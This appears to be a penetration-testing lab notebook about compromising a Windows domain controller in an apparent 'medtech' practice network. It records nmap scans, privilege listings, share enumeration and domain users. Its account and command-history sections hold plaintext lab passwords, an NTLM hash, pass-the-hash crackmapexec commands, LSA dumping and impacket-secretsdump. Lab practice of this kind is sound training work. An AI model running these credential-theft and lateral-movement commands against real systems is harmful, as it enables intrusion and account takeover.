# 172.16.213.10
# Navigation
- [Summary](#summary)
- [Flags](#flags)
- [Accounts](#accounts)
- [Enumeration](#enumeration)
    - [NMAP](#nmap)
    - [Local Users](#local-users)
    - [Local Groups](#local-groups)
    - [System Info](#system-info)
    - [Routes](#routes)
    - [Netstat](#netstat)
    - [Environment Vars](#environment-vars)
    - [Domain Controller Info](#domain-controller-info)
- [Services](#services)
    - [API Endpoints](#api-endpoints)
- [Command History](#command-history)
# Summary
-
# Flags    
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`

- C:\Users\Administrator\Desktop\proof.txt

# Accounts
### leon / rabbit:)
`evil-winrm -i 172.16.152.10 -u leon -p "rabbit:)"`
`whoami /priv`
```
Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```
`whoami /groups`
```
Group Name                                     Type             SID                                         Attributes
============================================== ================ =========================================== ===============================================================
Everyone                                       Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                  Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access     Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                         Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                           Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users               Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                 Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
MEDTECH\Domain Admins                          Group            S-1-5-21-976142013-3766213998-138799841-512 Mandatory group, Enabled by default, Enabled group
MEDTECH\Denied RODC Password Replication Group Alias            S-1-5-21-976142013-3766213998-138799841-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication               Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level           Label            S-1-16-12288
```
### joe / Flowers1
`smbclient -U 'joe%Flowers1' //172.16.213.10/SHARE`
[See Shares](#shares)  
`whoami /priv`
```

```
`whoami /groups`
```

```
# Enumeration
## NMAP
`sudo nmap -sV 172.16.213.10 --top-ports 1000`
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-28 20:31:16Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: medtech.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: medtech.com0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```
`sudo nmap -A -T4 -p- 172.16.213.10`
```
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-28T20:09:28
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:bf:c8 (VMware)

TRACEROUTE
HOP RTT      ADDRESS
1   48.60 ms 172.16.213.10

```
## Local Users
`Get-LocalUser`
```

```
## Local Groups
`Get-LocalGroup`
```

```
## System Info
`systeminfo`
```

```
## Routes
`route print`
```

```
## Netstat
`netstat -ano`
```

```
## Environment Vars
`Get-ChildItem Env:`
```

```
## Domain Controller Info
`nltest /dsgetdc:medtech`
```

```
# Services    
## API Endpoints
`gobuster dir -u http://192.168.159.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern`
```

```
## Shares
`crackmapexec smb 172.16.213.10 -u joe -H 08d7a47a6f9f66b97b1bae4178747494 --shares`
```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$          READ            Remote Admin
C$              READ,WRITE      Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
```
## Domain Computers
```
Name     OperatingSystem
----     ---------------
DC01     Windows Server 2022 Standard
FILES02  Windows Server 2022 Standard
DEV04    Windows Server 2022 Standard
CLIENT01 Windows 11 Enterprise
PROD01   Windows Server 2022 Standard
CLIENT02 Windows 11 Enterprise
WEB02    Windows Server 2022 Standard
```
## Domain Users
```
SamAccountName
--------------
Administrator
Guest
offsec
krbtgt
leon
joe
peach
mario
wario
yoshi
```
## Secrets Dump

# Command History
```c
    // from kali
    crackmapexec smb 172.16.213.10 -u joe -H 08d7a47a6f9f66b97b1bae4178747494 --shares
    crackmapexec smb 172.16.213.10 -u joe -H 08d7a47a6f9f66b97b1bae4178747494
    crackmapexec smb 172.16.213.10 -u joe -H 08d7a47a6f9f66b97b1bae4178747494 --lsa
    smbclient -U 'joe%Flowers1' //172.16.213.10/SYSVOL /C$ /ADMIN$
    //NT_STATUS_ACCESS_DENIED in most of C$
    // after winrm as leon
    Get-ADComputer -Filter * -Property Name,OperatingSystem | Select Name,OperatingSystem
    Get-ADUser -Filter * -Property DisplayName,SamAccountName | Select SamAccountName
    // from kali
    //secretsdump.py 'domain/leon@172.16.152.10'
    impacket-secretsdump 'medtech/leon@172.16.152.10'
    // see secretddumps.txt
    found -> C:\Users\Administrator> type Desktop/credentials.txt
    // offsec/century62hisan51
```
